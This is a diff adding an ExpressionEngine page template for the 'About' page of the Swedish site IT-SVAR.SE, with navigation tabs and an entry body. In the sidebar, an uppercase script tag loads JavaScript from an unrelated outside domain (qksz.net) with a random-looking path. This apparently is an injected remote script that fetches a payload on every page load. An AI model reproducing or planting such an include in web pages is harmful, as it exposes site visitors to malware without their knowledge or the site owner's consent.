@@ -1,0 +1,51 @@
+{exp:fbc:prepare_page}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"
+xmlns:og="http://opengraphprotocol.org/schema/"
+xmlns:fb="http://www.facebook.com/2008/fbml">
+
+{embed="embeds/html_header" my_page_title="Om"}
+
+<body>
+
+<div id="home" class="active"></div>
+{lv_snippets_start}
+
+<div class="container white">
+	<div class="row-fluid">
+		<div class="span12">
+			<div class="page-header">
+				<h1 style="padding-left:10px;">Om IT-SVAR.SE</h1>
+			</div>
+			{exp:selected item="{segment_2}" replace="class='active'"}
+				<ul class="nav nav-tabs">
+					{exp:channel:entries channel="about" orderby="entry_id" sort="asc" limit="1" dynamic="no"}
+						<li {selected_empty}><a href="{path='about/index'}">{title}</a></li>
+					{/exp:channel:entries}
+					{exp:channel:entries channel="about" orderby="entry_id" sort="asc" offset="1" dynamic="no"}
+						<li {selected_{url_title}}><a href="{url_title_path='about/index'}">{title}</a></li>
+					{/exp:channel:entries}
+				</ul>
+			{/exp:selected}
+		</div>
+	</div>
+	<div class="row">
+		<div class="span10">
+			{exp:channel:entries channel="about" orderby="entry_id" sort="asc" limit="1" pagination="bottom"}
+				<h2 style="padding-left:10px; color:#0088cc;">{title}</h2>
+				<div class="padded rounded_all clearfix" style="padding-top:6px;">
+					{about_entry}
+				</div>
+			{/exp:channel:entries}
+		</div>
+		<div class="span2 hidden-phone ">
+			<div class="padded rounded_all pull-right" style="margin-bottom:10px; padding:3px;">
+				<SCRIPT type="text/javascript" LANGUAGE="javascript" src="http://www.qksz.net/1e-lkre"> </SCRIPT>
+			</div>
+		</div>
+	</div>
+{lv_snippets_footer}
+</div>
+{lv_snippets_ad-banner}
+</body>
+</html>	
